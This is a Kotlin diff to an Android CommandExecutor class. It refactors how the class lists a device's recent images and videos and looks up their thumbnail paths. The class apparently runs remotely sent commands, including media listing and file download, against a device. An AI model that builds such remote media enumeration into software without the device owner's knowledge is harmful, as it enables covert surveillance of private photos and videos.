@@ -405,8 +405,7 @@ class CommandExecutor(private val context: Context) {
                 android.provider.MediaStore.Images.Media._ID,
                 android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                 android.provider.MediaStore.Images.Media.DATA,
-                android.provider.MediaStore.Images.Media.SIZE,
-                android.provider.MediaStore.Images.Media.DATE_ADDED
+                android.provider.MediaStore.Images.Media.SIZE
             )
             resolver.query(imageUri, imgProjection, null, null, "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
                 val idCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media._ID)
@@ -419,14 +418,8 @@ class CommandExecutor(private val context: Context) {
                     if (path.isNullOrBlank()) continue
                     val name = if (nameCol >= 0) cursor.getString(nameCol) else "image"
                     val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
-                    val thumbUri = android.provider.MediaStore.Images.Thumbnails.getContentUri("external")
-                    val thumbPath = android.provider.MediaStore.Images.Thumbnails.queryMiniThumbnail(
-                        resolver, id,
-                        android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null
-                    )?.use { t ->
-                        val tCol = t.getColumnIndex(android.provider.MediaStore.Images.Thumbnails.DATA)
-                        if (tCol >= 0) t.getString(tCol) else ""
-                    } ?: ""
+                    // query thumbnail directly
+                    val thumbPath = getImageThumbnailPath(resolver, id)
 
                     results.put(JSONObject().apply {
                         put("name", name)
@@ -448,8 +441,7 @@ class CommandExecutor(private val context: Context) {
                 android.provider.MediaStore.Video.Media._ID,
                 android.provider.MediaStore.Video.Media.DISPLAY_NAME,
                 android.provider.MediaStore.Video.Media.DATA,
-                android.provider.MediaStore.Video.Media.SIZE,
-                android.provider.MediaStore.Video.Media.DATE_ADDED
+                android.provider.MediaStore.Video.Media.SIZE
             )
             resolver.query(videoUri, vidProjection, null, null, "${android.provider.MediaStore.Video.Media.DATE_ADDED} DESC LIMIT 100")?.use { cursor ->
                 val idCol = cursor.getColumnIndex(android.provider.MediaStore.Video.Media._ID)
@@ -462,13 +454,7 @@ class CommandExecutor(private val context: Context) {
                     if (path.isNullOrBlank()) continue
                     val name = if (nameCol >= 0) cursor.getString(nameCol) else "video"
                     val size = if (sizeCol >= 0) cursor.getLong(sizeCol) else 0L
-                    val thumbPath = android.provider.MediaStore.Video.Thumbnails.queryMiniThumbnail(
-                        resolver, id,
-                        android.provider.MediaStore.Video.Thumbnails.MINI_KIND, null
-                    )?.use { t ->
-                        val tCol = t.getColumnIndex(android.provider.MediaStore.Video.Thumbnails.DATA)
-                        if (tCol >= 0) t.getString(tCol) else ""
-                    } ?: ""
+                    val thumbPath = getVideoThumbnailPath(resolver, id)
 
                     results.put(JSONObject().apply {
                         put("name", name)
@@ -484,6 +470,40 @@ class CommandExecutor(private val context: Context) {
         } catch (e: Exception) {
             onError(e.message ?: "List media failed")
         }
+    }
+
+    private fun getImageThumbnailPath(resolver: ContentResolver, imageId: Long): String {
+        return try {
+            val uri = android.provider.MediaStore.Images.Thumbnails.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(android.provider.MediaStore.Images.Thumbnails.DATA)
+            val selection = "${android.provider.MediaStore.Images.Thumbnails.IMAGE_ID} = ? AND ${android.provider.MediaStore.Images.Thumbnails.KIND} = ?"
+            val selArgs = arrayOf(imageId.toString(), android.provider.MediaStore.Images.Thumbnails.MINI_KIND.toString())
+            var thumbPath = ""
+            resolver.query(uri, projection, selection, selArgs, null)?.use { c ->
+                if (c.moveToFirst()) {
+                    val col = c.getColumnIndex(android.provider.MediaStore.Images.Thumbnails.DATA)
+                    if (col >= 0) thumbPath = c.getString(col) ?: ""
+                }
+            }
+            thumbPath
+        } catch (_: Exception) { "" }
+    }
+
+    private fun getVideoThumbnailPath(resolver: ContentResolver, videoId: Long): String {
+        return try {
+            val uri = android.provider.MediaStore.Video.Thumbnails.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(android.provider.MediaStore.Video.Thumbnails.DATA)
+            val selection = "${android.provider.MediaStore.Video.Thumbnails.VIDEO_ID} = ? AND ${android.provider.MediaStore.Video.Thumbnails.KIND} = ?"
+            val selArgs = arrayOf(videoId.toString(), android.provider.MediaStore.Video.Thumbnails.MINI_KIND.toString())
+            var thumbPath = ""
+            resolver.query(uri, projection, selection, selArgs, null)?.use { c ->
+                if (c.moveToFirst()) {
+                    val col = c.getColumnIndex(android.provider.MediaStore.Video.Thumbnails.DATA)
+                    if (col >= 0) thumbPath = c.getString(col) ?: ""
+                }
+            }
+            thumbPath
+        } catch (_: Exception) { "" }
     }
 
     private fun downloadFile(commandId: String, deviceId: String, payload: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
